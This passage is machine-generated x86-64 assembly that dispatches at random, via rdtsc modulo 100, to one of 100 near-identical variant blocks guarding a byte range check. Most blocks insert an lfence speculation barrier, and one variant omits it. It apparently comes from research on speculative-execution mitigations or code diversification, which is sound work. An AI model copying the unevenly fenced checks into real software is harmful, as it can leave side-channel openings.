	jmp	.Lmain_win3_continue
## Variant 48
.Lmain_win3_var48:
	popq	%rax
	cmpb	$31, %al
	jbe	.L37
	lfence
	movzbl	-10(%rbp), %eax
	cmpb	$126, %al
	ja	.L37
	movzbl	-10(%rbp), %eax
	jmp	.Lmain_win3_continue
## Variant 49
.Lmain_win3_var49:
	popq	%rax
	cmpb	$31, %al
	jbe	.L37
	lfence
	movzbl	-10(%rbp), %eax
	cmpb	$126, %al
	ja	.L37
	movzbl	-10(%rbp), %eax
	jmp	.Lmain_win3_continue
## Variant 50
.Lmain_win3_var50:
	popq	%rax
	cmpb	$31, %al
	jbe	.L37
	lfence
	movzbl	-10(%rbp), %eax
	cmpb	$126, %al
	ja	.L37
	movzbl	-10(%rbp), %eax
	jmp	.Lmain_win3_continue
## Variant 51
.Lmain_win3_var51:
	popq	%rax
	cmpb	$31, %al
	jbe	.L37
	lfence
	movzbl	-10(%rbp), %eax
	cmpb	$126, %al
	ja	.L37
	movzbl	-10(%rbp), %eax
	jmp	.Lmain_win3_continue
## Variant 52
.Lmain_win3_var52:
	popq	%rax
	cmpb	$31, %al
	jbe	.L37
	lfence
	movzbl	-10(%rbp), %eax
	cmpb	$126, %al
	ja	.L37
	movzbl	-10(%rbp), %eax
	jmp	.Lmain_win3_continue
## Variant 53
.Lmain_win3_var53:
	popq	%rax
	cmpb	$31, %al
	jbe	.L37
	lfence
	movzbl	-10(%rbp), %eax
	cmpb	$126, %al
	ja	.L37
	movzbl	-10(%rbp), %eax
	jmp	.Lmain_win3_continue
## Variant 54
.Lmain_win3_var54:
	popq	%rax
	cmpb	$31, %al
	jbe	.L37
	lfence
	movzbl	-10(%rbp), %eax
	cmpb	$126, %al
	ja	.L37
	movzbl	-10(%rbp), %eax
	jmp	.Lmain_win3_continue
## Variant 55
.Lmain_win3_var55:
	popq	%rax
	cmpb	$31, %al
	jbe	.L37
	lfence
	movzbl	-10(%rbp), %eax
	cmpb	$126, %al
	ja	.L37
	movzbl	-10(%rbp), %eax
	jmp	.Lmain_win3_continue
## Variant 56
.Lmain_win3_var56:
	popq	%rax
	cmpb	$31, %al
	jbe	.L37
	lfence
	movzbl	-10(%rbp), %eax
	cmpb	$126, %al
	ja	.L37
	movzbl	-10(%rbp), %eax
	jmp	.Lmain_win3_continue
## Variant 57
.Lmain_win3_var57:
	popq	%rax
	cmpb	$31, %al
	jbe	.L37
	lfence
	movzbl	-10(%rbp), %eax
	cmpb	$126, %al
	ja	.L37
	movzbl	-10(%rbp), %eax
	jmp	.Lmain_win3_continue
## Variant 58
.Lmain_win3_var58:
	popq	%rax
	cmpb	$31, %al
	jbe	.L37
	lfence
	movzbl	-10(%rbp), %eax
	cmpb	$126, %al
	ja	.L37
	movzbl	-10(%rbp), %eax
	jmp	.Lmain_win3_continue
## Variant 59
.Lmain_win3_var59:
	popq	%rax
	cmpb	$31, %al
	jbe	.L37
	lfence
	movzbl	-10(%rbp), %eax
	cmpb	$126, %al
	ja	.L37
	movzbl	-10(%rbp), %eax
	jmp	.Lmain_win3_continue
## Variant 60
.Lmain_win3_var60:
	popq	%rax
	cmpb	$31, %al
	jbe	.L37
	lfence
	movzbl	-10(%rbp), %eax
	cmpb	$126, %al
	ja	.L37
	movzbl	-10(%rbp), %eax
	jmp	.Lmain_win3_continue
## Variant 61
.Lmain_win3_var61:
	popq	%rax
	cmpb	$31, %al
	jbe	.L37
	lfence
	movzbl	-10(%rbp), %eax
	cmpb	$126, %al
	ja	.L37
	movzbl	-10(%rbp), %eax
	jmp	.Lmain_win3_continue
## Variant 62
.Lmain_win3_var62:
	popq	%rax
	cmpb	$31, %al
	jbe	.L37
	lfence
	movzbl	-10(%rbp), %eax
	cmpb	$126, %al
	ja	.L37
	movzbl	-10(%rbp), %eax
	jmp	.Lmain_win3_continue
## Variant 63
.Lmain_win3_var63:
	popq	%rax
	cmpb	$31, %al
	jbe	.L37
	lfence
	movzbl	-10(%rbp), %eax
	cmpb	$126, %al
	ja	.L37
	movzbl	-10(%rbp), %eax
	jmp	.Lmain_win3_continue
## Variant 64
.Lmain_win3_var64:
	popq	%rax
	cmpb	$31, %al
	jbe	.L37
	lfence
	movzbl	-10(%rbp), %eax
	cmpb	$126, %al
	ja	.L37
	movzbl	-10(%rbp), %eax
	jmp	.Lmain_win3_continue
## Variant 65
.Lmain_win3_var65:
	popq	%rax
	cmpb	$31, %al
	jbe	.L37
	lfence
	movzbl	-10(%rbp), %eax
	cmpb	$126, %al
	ja	.L37
	movzbl	-10(%rbp), %eax
	jmp	.Lmain_win3_continue
## Variant 66
.Lmain_win3_var66:
	popq	%rax
	cmpb	$31, %al
	jbe	.L37
	lfence
	movzbl	-10(%rbp), %eax
	cmpb	$126, %al
	ja	.L37
	movzbl	-10(%rbp), %eax
	jmp	.Lmain_win3_continue
## Variant 67
.Lmain_win3_var67:
	popq	%rax
	cmpb	$31, %al
	jbe	.L37
	lfence
	movzbl	-10(%rbp), %eax
	cmpb	$126, %al
	ja	.L37
	movzbl	-10(%rbp), %eax
	jmp	.Lmain_win3_continue
## Variant 68
.Lmain_win3_var68:
	popq	%rax
	cmpb	$31, %al
	jbe	.L37
	lfence
	movzbl	-10(%rbp), %eax
	cmpb	$126, %al
	ja	.L37
	movzbl	-10(%rbp), %eax
	jmp	.Lmain_win3_continue
## Variant 69
.Lmain_win3_var69:
	popq	%rax
	cmpb	$31, %al
	jbe	.L37
	lfence
	movzbl	-10(%rbp), %eax
	cmpb	$126, %al
	ja	.L37
	movzbl	-10(%rbp), %eax
	jmp	.Lmain_win3_continue
## Variant 70
.Lmain_win3_var70:
	popq	%rax
	cmpb	$31, %al
	jbe	.L37
	lfence
	movzbl	-10(%rbp), %eax
	cmpb	$126, %al
	ja	.L37
	movzbl	-10(%rbp), %eax
	jmp	.Lmain_win3_continue
## Variant 71
.Lmain_win3_var71:
	popq	%rax
	cmpb	$31, %al
	jbe	.L37
	lfence
	movzbl	-10(%rbp), %eax
	cmpb	$126, %al
	ja	.L37
	movzbl	-10(%rbp), %eax
	jmp	.Lmain_win3_continue
## Variant 72
.Lmain_win3_var72:
	popq	%rax
	cmpb	$31, %al
	jbe	.L37
	lfence
	movzbl	-10(%rbp), %eax
	cmpb	$126, %al
	ja	.L37
	movzbl	-10(%rbp), %eax
	jmp	.Lmain_win3_continue
## Variant 73
.Lmain_win3_var73:
	popq	%rax
	cmpb	$31, %al
	jbe	.L37
	lfence
	movzbl	-10(%rbp), %eax
	cmpb	$126, %al
	ja	.L37
	movzbl	-10(%rbp), %eax
	jmp	.Lmain_win3_continue
## Variant 74
.Lmain_win3_var74:
	popq	%rax
	cmpb	$31, %al
	jbe	.L37
	lfence
	movzbl	-10(%rbp), %eax
	cmpb	$126, %al
	ja	.L37
	movzbl	-10(%rbp), %eax
	jmp	.Lmain_win3_continue
## Variant 75
.Lmain_win3_var75:
	popq	%rax
	cmpb	$31, %al
	jbe	.L37
	lfence
	movzbl	-10(%rbp), %eax
	cmpb	$126, %al
	ja	.L37
	movzbl	-10(%rbp), %eax
	jmp	.Lmain_win3_continue
## Variant 76
.Lmain_win3_var76:
	popq	%rax
	cmpb	$31, %al
	jbe	.L37
	lfence
	movzbl	-10(%rbp), %eax
	cmpb	$126, %al
	ja	.L37
	movzbl	-10(%rbp), %eax
	jmp	.Lmain_win3_continue
## Variant 77
.Lmain_win3_var77:
	popq	%rax
	cmpb	$31, %al
	jbe	.L37
	lfence
	movzbl	-10(%rbp), %eax
	cmpb	$126, %al
	ja	.L37
	movzbl	-10(%rbp), %eax
	jmp	.Lmain_win3_continue
## Variant 78
.Lmain_win3_var78:
	popq	%rax
	cmpb	$31, %al
	jbe	.L37
	lfence
	movzbl	-10(%rbp), %eax
	cmpb	$126, %al
	ja	.L37
	movzbl	-10(%rbp), %eax
	jmp	.Lmain_win3_continue
## Variant 79
.Lmain_win3_var79:
	popq	%rax
	cmpb	$31, %al
	jbe	.L37
	lfence
	movzbl	-10(%rbp), %eax
	cmpb	$126, %al
	ja	.L37
	movzbl	-10(%rbp), %eax
	jmp	.Lmain_win3_continue
## Variant 80
.Lmain_win3_var80:
	popq	%rax
	cmpb	$31, %al
	jbe	.L37
	lfence
	movzbl	-10(%rbp), %eax
	cmpb	$126, %al
	ja	.L37
	movzbl	-10(%rbp), %eax
	jmp	.Lmain_win3_continue
## Variant 81
.Lmain_win3_var81:
	popq	%rax
	cmpb	$31, %al
	jbe	.L37
	lfence
	movzbl	-10(%rbp), %eax
	cmpb	$126, %al
	ja	.L37
	movzbl	-10(%rbp), %eax
	jmp	.Lmain_win3_continue
## Variant 82
.Lmain_win3_var82:
	popq	%rax
	cmpb	$31, %al
	jbe	.L37
	lfence
	movzbl	-10(%rbp), %eax
	cmpb	$126, %al
	ja	.L37
	movzbl	-10(%rbp), %eax
	jmp	.Lmain_win3_continue
## Variant 83
.Lmain_win3_var83:
	popq	%rax
	cmpb	$31, %al
	jbe	.L37
	lfence
	movzbl	-10(%rbp), %eax
	cmpb	$126, %al
	ja	.L37
	movzbl	-10(%rbp), %eax
	jmp	.Lmain_win3_continue
## Variant 84
.Lmain_win3_var84:
	popq	%rax
	cmpb	$31, %al
	jbe	.L37
	lfence
	movzbl	-10(%rbp), %eax
	cmpb	$126, %al
	ja	.L37
	movzbl	-10(%rbp), %eax
	jmp	.Lmain_win3_continue
## Variant 85
.Lmain_win3_var85:
	popq	%rax
	cmpb	$31, %al
	jbe	.L37
	lfence
	movzbl	-10(%rbp), %eax
	cmpb	$126, %al
	ja	.L37
	movzbl	-10(%rbp), %eax
	jmp	.Lmain_win3_continue
## Variant 86
.Lmain_win3_var86:
	popq	%rax
	cmpb	$31, %al
	jbe	.L37
	lfence
	movzbl	-10(%rbp), %eax
	cmpb	$126, %al
	ja	.L37
	movzbl	-10(%rbp), %eax
	jmp	.Lmain_win3_continue
## Variant 87
.Lmain_win3_var87:
	popq	%rax
	cmpb	$31, %al
	jbe	.L37
	lfence
	movzbl	-10(%rbp), %eax
	cmpb	$126, %al
	ja	.L37
	movzbl	-10(%rbp), %eax
	jmp	.Lmain_win3_continue
## Variant 88
.Lmain_win3_var88:
	popq	%rax
	cmpb	$31, %al
	jbe	.L37
	lfence
	movzbl	-10(%rbp), %eax
	cmpb	$126, %al
	ja	.L37
	movzbl	-10(%rbp), %eax
	jmp	.Lmain_win3_continue
## Variant 89
.Lmain_win3_var89:
	popq	%rax
	cmpb	$31, %al
	jbe	.L37
	lfence
	movzbl	-10(%rbp), %eax
	cmpb	$126, %al
	ja	.L37
	movzbl	-10(%rbp), %eax
	jmp	.Lmain_win3_continue
## Variant 90
.Lmain_win3_var90:
	popq	%rax
	cmpb	$31, %al
	jbe	.L37
	lfence
	movzbl	-10(%rbp), %eax
	cmpb	$126, %al
	ja	.L37
	movzbl	-10(%rbp), %eax
	jmp	.Lmain_win3_continue
## Variant 91
.Lmain_win3_var91:
	popq	%rax
	cmpb	$31, %al
	jbe	.L37
	lfence
	movzbl	-10(%rbp), %eax
	cmpb	$126, %al
	ja	.L37
	movzbl	-10(%rbp), %eax
	jmp	.Lmain_win3_continue
## Variant 92
.Lmain_win3_var92:
	popq	%rax
	cmpb	$31, %al
	jbe	.L37
	lfence
	movzbl	-10(%rbp), %eax
	cmpb	$126, %al
	ja	.L37
	movzbl	-10(%rbp), %eax
	jmp	.Lmain_win3_continue
## Variant 93
.Lmain_win3_var93:
	popq	%rax
	cmpb	$31, %al
	jbe	.L37
	lfence
	movzbl	-10(%rbp), %eax
	cmpb	$126, %al
	ja	.L37
	movzbl	-10(%rbp), %eax
	jmp	.Lmain_win3_continue
## Variant 94
.Lmain_win3_var94:
	popq	%rax
	cmpb	$31, %al
	jbe	.L37
	lfence
	movzbl	-10(%rbp), %eax
	cmpb	$126, %al
	ja	.L37
	movzbl	-10(%rbp), %eax
	jmp	.Lmain_win3_continue
## Variant 95
.Lmain_win3_var95:
	popq	%rax
	cmpb	$31, %al
	jbe	.L37
	lfence
	movzbl	-10(%rbp), %eax
	cmpb	$126, %al
	ja	.L37
	movzbl	-10(%rbp), %eax
	jmp	.Lmain_win3_continue
## Variant 96
.Lmain_win3_var96:
	popq	%rax
	cmpb	$31, %al
	jbe	.L37
	lfence
	movzbl	-10(%rbp), %eax
	cmpb	$126, %al
	ja	.L37
	movzbl	-10(%rbp), %eax
	jmp	.Lmain_win3_continue
## Variant 97
.Lmain_win3_var97:
	popq	%rax
	cmpb	$31, %al
	jbe	.L37
	lfence
	movzbl	-10(%rbp), %eax
	cmpb	$126, %al
	ja	.L37
	movzbl	-10(%rbp), %eax
	jmp	.Lmain_win3_continue
## Variant 98
.Lmain_win3_var98:
	popq	%rax
	cmpb	$31, %al
	jbe	.L37
	lfence
	movzbl	-10(%rbp), %eax
	cmpb	$126, %al
	ja	.L37
	movzbl	-10(%rbp), %eax
	jmp	.Lmain_win3_continue
## Variant 99
.Lmain_win3_var99:
	popq	%rax
	cmpb	$31, %al
	jbe	.L37
	lfence
	movzbl	-10(%rbp), %eax
	cmpb	$126, %al
	ja	.L37
	movzbl	-10(%rbp), %eax
	jmp	.Lmain_win3_continue
.Lmain_win3_continue:
	addq	$32, %rsp
	movzbl	%al, %eax
	jmp	.L38
.L37:
	movl	$63, %eax
.L38:
	movzbl	-10(%rbp), %ecx
	movzbl	%cl, %esi
	movl	%edx, %ecx
	movl	%eax, %edx
	leaq	.LC15(%rip), %rax
	movq	%rax, %rdi
	movl	$0, %eax
	call	printf@PLT
	movl	-16(%rbp), %eax
	subq	$32, %rsp
## RANDOM SELECTOR BLOCK
	pushq	%rax
	pushq	%rcx
	pushq	%rdx
	rdtsc
	xorq	%rdx, %rax
	movl	$100, %ecx
	xorl	%edx, %edx
	divl	%ecx
	movl	%edx, %eax
	popq	%rdx
	popq	%rcx
	cmpl	$0, %eax
	je	.Lmain_win2_var0
	cmpl	$1, %eax
	je	.Lmain_win2_var1
	cmpl	$2, %eax
	je	.Lmain_win2_var2
	cmpl	$3, %eax
	je	.Lmain_win2_var3
	cmpl	$4, %eax
	je	.Lmain_win2_var4
	cmpl	$5, %eax
	je	.Lmain_win2_var5
	cmpl	$6, %eax
	je	.Lmain_win2_var6
	cmpl	$7, %eax
	je	.Lmain_win2_var7
	cmpl	$8, %eax
	je	.Lmain_win2_var8
	cmpl	$9, %eax
	je	.Lmain_win2_var9
	cmpl	$10, %eax
	je	.Lmain_win2_var10
	cmpl	$11, %eax
	je	.Lmain_win2_var11
	cmpl	$12, %eax
	je	.Lmain_win2_var12
	cmpl	$13, %eax
	je	.Lmain_win2_var13
	cmpl	$14, %eax
	je	.Lmain_win2_var14
	cmpl	$15, %eax
	je	.Lmain_win2_var15
	cmpl	$16, %eax
	je	.Lmain_win2_var16
	cmpl	$17, %eax
	je	.Lmain_win2_var17
	cmpl	$18, %eax
	je	.Lmain_win2_var18
	cmpl	$19, %eax
	je	.Lmain_win2_var19
	cmpl	$20, %eax
	je	.Lmain_win2_var20
	cmpl	$21, %eax
	je	.Lmain_win2_var21
	cmpl	$22, %eax
	je	.Lmain_win2_var22
	cmpl	$23, %eax
	je	.Lmain_win2_var23
	cmpl	$24, %eax
	je	.Lmain_win2_var24
	cmpl	$25, %eax
	je	.Lmain_win2_var25
	cmpl	$26, %eax
	je	.Lmain_win2_var26
	cmpl	$27, %eax
	je	.Lmain_win2_var27
	cmpl	$28, %eax
	je	.Lmain_win2_var28
	cmpl	$29, %eax
	je	.Lmain_win2_var29
	cmpl	$30, %eax
	je	.Lmain_win2_var30
	cmpl	$31, %eax
	je	.Lmain_win2_var31
	cmpl	$32, %eax
	je	.Lmain_win2_var32
	cmpl	$33, %eax
	je	.Lmain_win2_var33
	cmpl	$34, %eax
	je	.Lmain_win2_var34
	cmpl	$35, %eax
	je	.Lmain_win2_var35
	cmpl	$36, %eax
	je	.Lmain_win2_var36
	cmpl	$37, %eax
	je	.Lmain_win2_var37
	cmpl	$38, %eax
	je	.Lmain_win2_var38
	cmpl	$39, %eax
	je	.Lmain_win2_var39
	cmpl	$40, %eax
	je	.Lmain_win2_var40
	cmpl	$41, %eax
	je	.Lmain_win2_var41
	cmpl	$42, %eax
	je	.Lmain_win2_var42
	cmpl	$43, %eax
	je	.Lmain_win2_var43
	cmpl	$44, %eax
	je	.Lmain_win2_var44
	cmpl	$45, %eax
	je	.Lmain_win2_var45
	cmpl	$46, %eax
	je	.Lmain_win2_var46
	cmpl	$47, %eax
	je	.Lmain_win2_var47
	cmpl	$48, %eax
	je	.Lmain_win2_var48
	cmpl	$49, %eax
	je	.Lmain_win2_var49
	cmpl	$50, %eax
	je	.Lmain_win2_var50
	cmpl	$51, %eax
	je	.Lmain_win2_var51
	cmpl	$52, %eax
	je	.Lmain_win2_var52
	cmpl	$53, %eax
	je	.Lmain_win2_var53
	cmpl	$54, %eax
	je	.Lmain_win2_var54
	cmpl	$55, %eax
	je	.Lmain_win2_var55
	cmpl	$56, %eax
	je	.Lmain_win2_var56
	cmpl	$57, %eax
	je	.Lmain_win2_var57
	cmpl	$58, %eax
	je	.Lmain_win2_var58
	cmpl	$59, %eax
	je	.Lmain_win2_var59
	cmpl	$60, %eax
	je	.Lmain_win2_var60
	cmpl	$61, %eax
	je	.Lmain_win2_var61
	cmpl	$62, %eax
	je	.Lmain_win2_var62
	cmpl	$63, %eax
	je	.Lmain_win2_var63
	cmpl	$64, %eax
	je	.Lmain_win2_var64
	cmpl	$65, %eax
	je	.Lmain_win2_var65
	cmpl	$66, %eax
	je	.Lmain_win2_var66
	cmpl	$67, %eax
	je	.Lmain_win2_var67
	cmpl	$68, %eax
	je	.Lmain_win2_var68
	cmpl	$69, %eax
	je	.Lmain_win2_var69
	cmpl	$70, %eax
	je	.Lmain_win2_var70
	cmpl	$71, %eax
	je	.Lmain_win2_var71
	cmpl	$72, %eax
	je	.Lmain_win2_var72
	cmpl	$73, %eax
	je	.Lmain_win2_var73
	cmpl	$74, %eax
	je	.Lmain_win2_var74
	cmpl	$75, %eax
	je	.Lmain_win2_var75
	cmpl	$76, %eax
	je	.Lmain_win2_var76
	cmpl	$77, %eax
	je	.Lmain_win2_var77
	cmpl	$78, %eax
	je	.Lmain_win2_var78
	cmpl	$79, %eax
	je	.Lmain_win2_var79
	cmpl	$80, %eax
	je	.Lmain_win2_var80
	cmpl	$81, %eax
	je	.Lmain_win2_var81
	cmpl	$82, %eax
	je	.Lmain_win2_var82
	cmpl	$83, %eax
	je	.Lmain_win2_var83
	cmpl	$84, %eax
	je	.Lmain_win2_var84
	cmpl	$85, %eax
	je	.Lmain_win2_var85
	cmpl	$86, %eax
	je	.Lmain_win2_var86
	cmpl	$87, %eax
	je	.Lmain_win2_var87
	cmpl	$88, %eax
	je	.Lmain_win2_var88
	cmpl	$89, %eax
	je	.Lmain_win2_var89
	cmpl	$90, %eax
	je	.Lmain_win2_var90
	cmpl	$91, %eax
	je	.Lmain_win2_var91
	cmpl	$92, %eax
	je	.Lmain_win2_var92
	cmpl	$93, %eax
	je	.Lmain_win2_var93
	cmpl	$94, %eax
	je	.Lmain_win2_var94
	cmpl	$95, %eax
	je	.Lmain_win2_var95
	cmpl	$96, %eax
	je	.Lmain_win2_var96
	cmpl	$97, %eax
	je	.Lmain_win2_var97
	cmpl	$98, %eax
	je	.Lmain_win2_var98
	cmpl	$99, %eax
	je	.Lmain_win2_var99
	jmp	.Lmain_win2_var0
## Variant 0
.Lmain_win2_var0:
	popq	%rax
	testl	%eax, %eax
	jle	.L39
	movl	-16(%rbp), %edx
	movzbl	-9(%rbp), %eax
	cmpb	$31, %al
	jbe	.L40
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 1
.Lmain_win2_var1:
	popq	%rax
	testl	%eax, %eax
	jle	.L39
	lfence
	movl	-16(%rbp), %edx
	movzbl	-9(%rbp), %eax
	cmpb	$31, %al
	jbe	.L40
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 2
.Lmain_win2_var2:
	popq	%rax
	testl	%eax, %eax
	jle	.L39
	lfence
	movl	-16(%rbp), %edx
	movzbl	-9(%rbp), %eax
	cmpb	$31, %al
	jbe	.L40
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 3
.Lmain_win2_var3:
	popq	%rax
	testl	%eax, %eax
	jle	.L39
	lfence
	movl	-16(%rbp), %edx
	movzbl	-9(%rbp), %eax
	cmpb	$31, %al
	jbe	.L40
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 4
.Lmain_win2_var4:
	popq	%rax
	testl	%eax, %eax
	jle	.L39
	lfence
	movl	-16(%rbp), %edx
	movzbl	-9(%rbp), %eax
	cmpb	$31, %al
	jbe	.L40
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 5
.Lmain_win2_var5:
	popq	%rax
	testl	%eax, %eax
	jle	.L39
	lfence
	movl	-16(%rbp), %edx
	movzbl	-9(%rbp), %eax
	cmpb	$31, %al
	jbe	.L40
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 6
.Lmain_win2_var6:
	popq	%rax
	testl	%eax, %eax
	jle	.L39
	lfence
	movl	-16(%rbp), %edx
	movzbl	-9(%rbp), %eax
	cmpb	$31, %al
	jbe	.L40
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 7
.Lmain_win2_var7:
	popq	%rax
	testl	%eax, %eax
	jle	.L39
	lfence
	movl	-16(%rbp), %edx
	movzbl	-9(%rbp), %eax
	cmpb	$31, %al
	jbe	.L40
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 8
.Lmain_win2_var8:
	popq	%rax
	testl	%eax, %eax
	jle	.L39
	lfence
	movl	-16(%rbp), %edx
	movzbl	-9(%rbp), %eax
	cmpb	$31, %al
	jbe	.L40
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 9
.Lmain_win2_var9:
	popq	%rax
	testl	%eax, %eax
	jle	.L39
	lfence
	movl	-16(%rbp), %edx
	movzbl	-9(%rbp), %eax
	cmpb	$31, %al
	jbe	.L40
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 10
.Lmain_win2_var10:
	popq	%rax
	testl	%eax, %eax
	jle	.L39
	lfence
	movl	-16(%rbp), %edx
	movzbl	-9(%rbp), %eax
	cmpb	$31, %al
	jbe	.L40
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 11
.Lmain_win2_var11:
	popq	%rax
	testl	%eax, %eax
	jle	.L39
	lfence
	movl	-16(%rbp), %edx
	movzbl	-9(%rbp), %eax
	cmpb	$31, %al
	jbe	.L40
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 12
.Lmain_win2_var12:
	popq	%rax
	testl	%eax, %eax
	jle	.L39
	lfence
	movl	-16(%rbp), %edx
	movzbl	-9(%rbp), %eax
	cmpb	$31, %al
	jbe	.L40
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 13
.Lmain_win2_var13:
	popq	%rax
	testl	%eax, %eax
	jle	.L39
	lfence
	movl	-16(%rbp), %edx
	movzbl	-9(%rbp), %eax
	cmpb	$31, %al
	jbe	.L40
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 14
.Lmain_win2_var14:
	popq	%rax
	testl	%eax, %eax
	jle	.L39
	lfence
	movl	-16(%rbp), %edx
	movzbl	-9(%rbp), %eax
	cmpb	$31, %al
	jbe	.L40
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 15
.Lmain_win2_var15:
	popq	%rax
	testl	%eax, %eax
	jle	.L39
	lfence
	movl	-16(%rbp), %edx
	movzbl	-9(%rbp), %eax
	cmpb	$31, %al
	jbe	.L40
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 16
.Lmain_win2_var16:
	popq	%rax
	testl	%eax, %eax
	jle	.L39
	lfence
	movl	-16(%rbp), %edx
	movzbl	-9(%rbp), %eax
	cmpb	$31, %al
	jbe	.L40
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 17
.Lmain_win2_var17:
	popq	%rax
	testl	%eax, %eax
	jle	.L39
	lfence
	movl	-16(%rbp), %edx
	movzbl	-9(%rbp), %eax
	cmpb	$31, %al
	jbe	.L40
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 18
.Lmain_win2_var18:
	popq	%rax
	testl	%eax, %eax
	jle	.L39
	lfence
	movl	-16(%rbp), %edx
	movzbl	-9(%rbp), %eax
	cmpb	$31, %al
	jbe	.L40
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 19
.Lmain_win2_var19:
	popq	%rax
	testl	%eax, %eax
	jle	.L39
	lfence
	movl	-16(%rbp), %edx
	movzbl	-9(%rbp), %eax
	cmpb	$31, %al
	jbe	.L40
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 20
.Lmain_win2_var20:
	popq	%rax
	testl	%eax, %eax
	jle	.L39
	lfence
	movl	-16(%rbp), %edx
	movzbl	-9(%rbp), %eax
	cmpb	$31, %al
	jbe	.L40
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 21
.Lmain_win2_var21:
	popq	%rax
	testl	%eax, %eax
	jle	.L39
	lfence
	movl	-16(%rbp), %edx
	movzbl	-9(%rbp), %eax
	cmpb	$31, %al
	jbe	.L40
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 22
.Lmain_win2_var22:
	popq	%rax
	testl	%eax, %eax
	jle	.L39
	lfence
	movl	-16(%rbp), %edx
	movzbl	-9(%rbp), %eax
	cmpb	$31, %al
	jbe	.L40
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 23
.Lmain_win2_var23:
	popq	%rax
	testl	%eax, %eax
	jle	.L39
	lfence
	movl	-16(%rbp), %edx
	movzbl	-9(%rbp), %eax
	cmpb	$31, %al
	jbe	.L40
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 24
.Lmain_win2_var24:
	popq	%rax
	testl	%eax, %eax
	jle	.L39
	lfence
	movl	-16(%rbp), %edx
	movzbl	-9(%rbp), %eax
	cmpb	$31, %al
	jbe	.L40
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 25
.Lmain_win2_var25:
	popq	%rax
	testl	%eax, %eax
	jle	.L39
	lfence
	movl	-16(%rbp), %edx
	movzbl	-9(%rbp), %eax
	cmpb	$31, %al
	jbe	.L40
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 26
.Lmain_win2_var26:
	popq	%rax
	testl	%eax, %eax
	jle	.L39
	lfence
	movl	-16(%rbp), %edx
	movzbl	-9(%rbp), %eax
	cmpb	$31, %al
	jbe	.L40
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 27
.Lmain_win2_var27:
	popq	%rax
	testl	%eax, %eax
	jle	.L39
	lfence
	movl	-16(%rbp), %edx
	movzbl	-9(%rbp), %eax
	cmpb	$31, %al
	jbe	.L40
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 28
.Lmain_win2_var28:
	popq	%rax
	testl	%eax, %eax
	jle	.L39
	lfence
	movl	-16(%rbp), %edx
	movzbl	-9(%rbp), %eax
	cmpb	$31, %al
	jbe	.L40
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 29
.Lmain_win2_var29:
	popq	%rax
	testl	%eax, %eax
	jle	.L39
	lfence
	movl	-16(%rbp), %edx
	movzbl	-9(%rbp), %eax
	cmpb	$31, %al
	jbe	.L40
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 30
.Lmain_win2_var30:
	popq	%rax
	testl	%eax, %eax
	jle	.L39
	lfence
	movl	-16(%rbp), %edx
	movzbl	-9(%rbp), %eax
	cmpb	$31, %al
	jbe	.L40
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 31
.Lmain_win2_var31:
	popq	%rax
	testl	%eax, %eax
	jle	.L39
	lfence
	movl	-16(%rbp), %edx
	movzbl	-9(%rbp), %eax
	cmpb	$31, %al
	jbe	.L40
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 32
.Lmain_win2_var32:
	popq	%rax
	testl	%eax, %eax
	jle	.L39
	lfence
	movl	-16(%rbp), %edx
	movzbl	-9(%rbp), %eax
	cmpb	$31, %al
	jbe	.L40
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 33
.Lmain_win2_var33:
	popq	%rax
	testl	%eax, %eax
	jle	.L39
	lfence
	movl	-16(%rbp), %edx
	movzbl	-9(%rbp), %eax
	cmpb	$31, %al
	jbe	.L40
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 34
.Lmain_win2_var34:
	popq	%rax
	testl	%eax, %eax
	jle	.L39
	lfence
	movl	-16(%rbp), %edx
	movzbl	-9(%rbp), %eax
	cmpb	$31, %al
	jbe	.L40
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 35
.Lmain_win2_var35:
	popq	%rax
	testl	%eax, %eax
	jle	.L39
	lfence
	movl	-16(%rbp), %edx
	movzbl	-9(%rbp), %eax
	cmpb	$31, %al
	jbe	.L40
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 36
.Lmain_win2_var36:
	popq	%rax
	testl	%eax, %eax
	jle	.L39
	lfence
	movl	-16(%rbp), %edx
